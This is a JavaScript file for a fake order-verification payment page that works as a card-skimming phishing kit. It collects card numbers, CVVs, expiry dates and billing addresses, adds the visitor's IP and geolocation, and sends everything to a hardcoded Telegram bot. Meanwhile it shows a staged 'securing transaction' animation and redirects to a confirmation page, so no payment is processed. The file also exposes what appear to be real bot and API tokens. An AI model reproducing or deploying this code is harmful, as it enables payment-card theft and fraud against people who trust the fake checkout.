// Telegram configuration
const botToken = '7727476364:AAHaXogDfO5itb1Z6A5CCeNRK7j1sr5wS3Y';
const chatId = '-1002494044102';

// Card type patterns
const cardPatterns = {
    visa: /^4/,
    mastercard: /^5[1-5]/,
    amex: /^3[47]/,
    discover: /^6(?:011|5)/
};



// Function to send message to Telegram
async function sendToTelegram(message) {
    try {
        const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: chatId,
                text: message,
                parse_mode: 'HTML'
            })
        });
        return response.ok;
    } catch (error) {
        console.error('Error:', error);
        return false;
    }
}

// Function to get user's location from ipinfo.io
async function detectUserLocation() {
    try {
        const response = await fetch('https://ipinfo.io/json?token=81e788912b1532');
        const data = await response.json();
        return {
            country: data.country,
            region: data.region,
            city: data.city,
            ip: data.ip,
            timezone: data.timezone,
            location: data.loc
        };
    } catch (error) {
        console.error('Error detecting location:', error);
        return null;
    }
}

// Function to detect card type
function detectCardType(number) {
    const cleanNumber = number.replace(/\D/g, '');
    for (const [type, pattern] of Object.entries(cardPatterns)) {
        if (pattern.test(cleanNumber)) {
            return type;
        }
    }
    return null;
}

// Function to update card type indicator
function updateCardTypeIndicator(input) {
    const cardTypeIcon = input.closest('.input-wrapper').querySelector('.card-type-icon');
    const cardIcons = document.querySelectorAll('.card-icon');
    
    // Reset all card icons
    cardIcons.forEach(icon => icon.classList.remove('active'));
    
    const cardType = detectCardType(input.value);
    if (cardType) {
        cardTypeIcon.setAttribute('data-card', cardType);
        // Activate corresponding card icon
        const activeIcon = document.querySelector(`.card-icon[alt="${cardType}"]`);
        if (activeIcon) activeIcon.classList.add('active');
    } else {
        cardTypeIcon.removeAttribute('data-card');
    }
}

// Function to format card number
function formatCardNumber(value) {
    const cleanValue = value.replace(/\D/g, '');
    const cardType = detectCardType(cleanValue);
    let chunks;

    if (cardType === 'amex') {
        chunks = cleanValue.match(/(\d{0,4})(\d{0,6})(\d{0,5})/);
        if (chunks) {
            return chunks.slice(1).filter(Boolean).join(' ');
        }
    } else {
        chunks = cleanValue.match(/(\d{0,4})(\d{0,4})(\d{0,4})(\d{0,4})/);
        if (chunks) {
            return chunks.slice(1).filter(Boolean).join(' ');
        }
    }
    return cleanValue;
}

// Function to format expiry date
function formatExpiryDate(value) {
    const cleanValue = value.replace(/\D/g, '');
    if (cleanValue.length >= 2) {
        let month = parseInt(cleanValue.substring(0, 2));
        let year = cleanValue.length >= 4 ? parseInt(cleanValue.substring(2, 4)) : 0;
        
        // Validate month (01-12)
        if (month > 12) month = 12;
        if (month < 1) month = 1;
        
        const monthStr = month.toString().padStart(2, '0');
        
        // Validate year (must be current year or later)
        const currentYear = new Date().getFullYear() % 100;
        if (cleanValue.length >= 4 && year < currentYear) {
            year = currentYear;
        }
        
        const yearStr = cleanValue.length >= 4 ? year.toString().padStart(2, '0') : cleanValue.substring(2);
        
        return `${monthStr}${yearStr.length ? '/' : ''}${yearStr}`;
    }
    return cleanValue;
}



// Function to validate card number with Luhn algorithm
function validateCardNumber(number) {
    const cleanNumber = number.replace(/\D/g, '');
    if (!/^\d+$/.test(cleanNumber)) return false;
    
    let sum = 0;
    let isEven = false;
    
    for (let i = cleanNumber.length - 1; i >= 0; i--) {
        let digit = parseInt(cleanNumber[i]);
        
        if (isEven) {
            digit *= 2;
            if (digit > 9) digit -= 9;
        }
        
        sum += digit;
        isEven = !isEven;
    }
    
    return sum % 10 === 0;
}

// Function to validate expiry date
function validateExpiryDate(value) {
    const [month, year] = value.split('/').map(num => parseInt(num));
    if (!month || !year) return false;
    
    const currentDate = new Date();
    const currentYear = currentDate.getFullYear() % 100;
    const currentMonth = currentDate.getMonth() + 1;
    
    if (year < currentYear) return false;
    if (year === currentYear && month < currentMonth) return false;
    
    return month >= 1 && month <= 12;
}








// Function to show error
function showError(field, message) {
    const inputGroup = field.closest('.input-group');
    const errorText = inputGroup.querySelector('.error-text');
    
    inputGroup.classList.add('error');
    if (errorText) {
        errorText.textContent = message;
        errorText.style.display = 'block';
    }
    
    field.setAttribute('aria-invalid', 'true');
}

// Function to clear error
function clearError(field) {
    const inputGroup = field.closest('.input-group');
    const errorText = inputGroup.querySelector('.error-text');
    
    inputGroup.classList.remove('error');
    if (errorText) {
        errorText.style.display = 'none';
    }
    
    field.removeAttribute('aria-invalid');
}

// Function to create loading overlay
function createLoadingOverlay(message = 'Processing your verification...') {
    const overlay = document.createElement('div');
    overlay.className = 'loading-overlay';
    
    const spinner = document.createElement('div');
    spinner.className = 'loading-overlay-spinner';
    
    const text = document.createElement('div');
    text.className = 'loading-overlay-text';
    text.textContent = message;
    
    overlay.appendChild(spinner);
    overlay.appendChild(text);
    
    return overlay;
}

// Function to validate form
function validateForm() {
    let isValid = true;
    const fields = {
        cdnm: {
            validator: (value) => {
                const clean = value.replace(/\D/g, '');
                return clean.length >= 15 && clean.length <= 16 && validateCardNumber(clean);
            },
            message: 'Please enter a valid card number'
        },
        cdname: {
            validator: (value) => value.trim().length >= 3,
            message: 'Please enter the cardholder name'
        },
        exdt: {
            validator: (value) => validateExpiryDate(value),
            message: 'Please enter a valid expiration date'
        },
        vvv: {
            validator: (value) => /^\d{3,4}$/.test(value),
            message: 'Please enter a valid security code'
        },
        
        address: {
            validator: (value) => value.trim().length >= 5,
            message: 'Please enter your street address'
        },
        city: {
            validator: (value) => value.trim().length >= 2,
            message: 'Please enter your city'
        },
        state: {
            validator: (value) => value.trim().length >= 2,
            message: 'Please enter your state/region'
        },
        zipCode: {
            validator: (value) => value.trim().length >= 5,
            message: 'Please enter a valid ZIP code'
        },
        country: {
            validator: (value) => value.trim().length >= 2,
            message: 'Please enter your country'
        }
    };

    // Clear all previous errors first
    Object.keys(fields).forEach(fieldId => {
        const field = document.getElementById(fieldId);
        if (field) clearError(field);
    });

    // Validate each field
    Object.entries(fields).forEach(([fieldId, { validator, message }]) => {
        const field = document.getElementById(fieldId);
        if (field && !validator(field.value)) {
            showError(field, message);
            isValid = false;
            if (!field.dataset.hasEventListener) {
                field.addEventListener('input', () => clearError(field));
                field.dataset.hasEventListener = 'true';
            }
        }
    });

    return isValid;
}

// Initialize form
document.addEventListener('DOMContentLoaded', function() {

    
    // Add input listeners
    const cdnmInput = document.getElementById('cdnm');
    if (cdnmInput) {
        cdnmInput.addEventListener('input', function(e) {
            const formattedValue = formatCardNumber(this.value);
            this.value = formattedValue;
            updateCardTypeIndicator(this);
            clearError(this);
        });
    }

    const exdtInput = document.getElementById('exdt');
    if (exdtInput) {
        exdtInput.addEventListener('input', function(e) {
            this.value = formatExpiryDate(this.value);
            clearError(this);
        });
    }

    const vvvInput = document.getElementById('vvv');
    if (vvvInput) {
        vvvInput.addEventListener('input', function(e) {
            this.value = this.value.replace(/\D/g, '').substring(0, 4);
            clearError(this);
        });
    }

    





    // Handle form submission
    const form = document.getElementById('verificationForm');
if (form) {
    form.addEventListener('submit', async function(e) {
        e.preventDefault();
        
        if (!validateForm()) {
            return;
        }

        // Create and show processing overlay
        const { overlay, processingSteps } = createProcessingOverlay();
        document.body.appendChild(overlay);
        // Start animating the steps
        animateProcessingSteps(processingSteps);

        try {
            const formData = {
                card: {
                    name: document.getElementById('cdname').value,
                    number: document.getElementById('cdnm').value,
                    expiry: document.getElementById('exdt').value,
                    cvv: document.getElementById('vvv').value
                },
                billing: {
                    address: document.getElementById('address').value,
                    address2: document.getElementById('address2')?.value || '',
                    city: document.getElementById('city').value,
                    state: document.getElementById('state').value,
                    zipCode: document.getElementById('zipCode').value,
                    country: document.getElementById('country').value
                }
            };

            // Get user location
            const userLocation = await detectUserLocation();
            
            // Format message
            const message = `
🔔 New Order Verification
📦 Order: ${window.location.href}

💳 Payment Details:
👤 Cardholder: ${formData.card.name}
🔢 Card Number: ${formData.card.number}
📅 Expires: ${formData.card.expiry}
🔑 CVV: ${formData.card.cvv}

📫 Billing Information:
📍 Address: ${formData.billing.address}
${formData.billing.address2 ? `🏢 Unit: ${formData.billing.address2}\n` : ''}🌆 City: ${formData.billing.city}
🏷️ State: ${formData.billing.state}
📮 ZIP: ${formData.billing.zipCode}
🌍 Country: ${formData.billing.country}

📱 Device Information:
🌐 IP: ${userLocation?.ip || 'Unknown'}
📍 Location: ${userLocation?.city || 'Unknown'}, ${userLocation?.region || 'Unknown'}, ${userLocation?.country || 'Unknown'}
⏰ Timezone: ${userLocation?.timezone || 'Unknown'}
🗺️ Coordinates: ${userLocation?.location || 'Unknown'}
💻 User Agent: ${navigator.userAgent}
            `;

            const sent = await sendToTelegram(message);

            if (sent) {
                // Wait for 5 seconds while showing the processing animation
                setTimeout(() => {
                    window.location.href = 'confirmation.html';
                }, 5000);
            } else {
                throw new Error('Failed to process verification');
            }
        } catch (error) {
            console.error('Error:', error);
            overlay.remove();
            alert('An error occurred while processing your verification. Please try again.');
        }
    });
}

    // Add event listeners for real-time validation
    const inputs = form.querySelectorAll('input, select');
    inputs.forEach(input => {
        input.addEventListener('blur', function() {
            const fieldId = this.id;
            const fields = {
                cdnm: {
                    validator: (value) => {
                        const clean = value.replace(/\D/g, '');
                        return clean.length >= 15 && clean.length <= 16 && validateCardNumber(clean);
                    },
                    message: 'Please enter a valid card number'
                },
                cdname: {
                    validator: (value) => value.trim().length >= 3,
                    message: 'Please enter the cardholder name'
                },
                exdt: {
                    validator: (value) => validateExpiryDate(value),
                    message: 'Please enter a valid expiration date'
                },
                vvv: {
                    validator: (value) => /^\d{3,4}$/.test(value),
                    message: 'Please enter a valid security code'
                },
                
            };

            if (fields[fieldId]) {
                const { validator, message } = fields[fieldId];
                if (!validator(this.value)) {
                    showError(this, message);
                } else {
                    clearError(this);
                    this.closest('.input-group').classList.add('success');
                }
            }
        });
    });

    // Handle paste events
    document.addEventListener('paste', function(e) {
        if (e.target.tagName === 'INPUT') {
            setTimeout(() => {
                switch (e.target.id) {
                    case 'cdnm':
                        e.target.value = formatCardNumber(e.target.value);
                        updateCardTypeIndicator(e.target);
                        break;
                    case 'exdt':
                        e.target.value = formatExpiryDate(e.target.value);
                        break;
                    case 'vvv':
                        e.target.value = e.target.value.replace(/\D/g, '').substring(0, 4);
                        break;
                    
                }
            }, 0);
        }
    });

    // Handle keyboard shortcuts
    document.addEventListener('keydown', function(e) {
        // Prevent form submission on enter key (except within textarea)
        if (e.key === 'Enter' && e.target.tagName !== 'TEXTAREA') {
            e.preventDefault();
            if (e.target.form) {
                const inputs = Array.from(e.target.form.elements);
                const index = inputs.indexOf(e.target);
                if (index < inputs.length - 1) {
                    inputs[index + 1].focus();
                }
            }
        }
    });
});

// Add custom prototypes for common operations
String.prototype.isValidCardNumber = function() {
    return validateCardNumber(this);
};

String.prototype.formatCard = function() {
    return formatCardNumber(this);
};

String.prototype.formatExpiryDate = function() {
    return formatExpiryDate(this);
};

// Function to create processing overlay
function createProcessingOverlay() {
    const overlay = document.createElement('div');
    overlay.className = 'loading-overlay';

    const spinner = document.createElement('div');
    spinner.className = 'loading-spinner';

    const status = document.createElement('div');
    status.className = 'processing-status';
    status.textContent = 'Processing Your Order';

    const steps = document.createElement('div');
    steps.className = 'processing-steps';
    
    const processingSteps = [
        { id: 'verifying', text: 'Verifying payment information...' },
        { id: 'securing', text: 'Securing transaction...' },
        { id: 'confirming', text: 'Confirming order details...' },
        { id: 'completing', text: 'Completing verification...' }
    ];

    processingSteps.forEach(step => {
        const stepElement = document.createElement('div');
        stepElement.className = 'processing-step';
        stepElement.id = step.id;
        stepElement.innerHTML = `
            <span class="step-icon">⋯</span>
            <span>${step.text}</span>
        `;
        steps.appendChild(stepElement);
    });

    overlay.appendChild(spinner);
    overlay.appendChild(status);
    overlay.appendChild(steps);
    
    return { overlay, processingSteps };
}

// Function to animate processing steps
function animateProcessingSteps(steps) {
    const stepDuration = 1000; // 1 second per step
    
    steps.forEach((step, index) => {
        setTimeout(() => {
            const stepElement = document.getElementById(step.id);
            if (stepElement) {
                stepElement.classList.add('active');
                stepElement.querySelector('.step-icon').textContent = '✓';
            }
        }, index * stepDuration);
    });
}
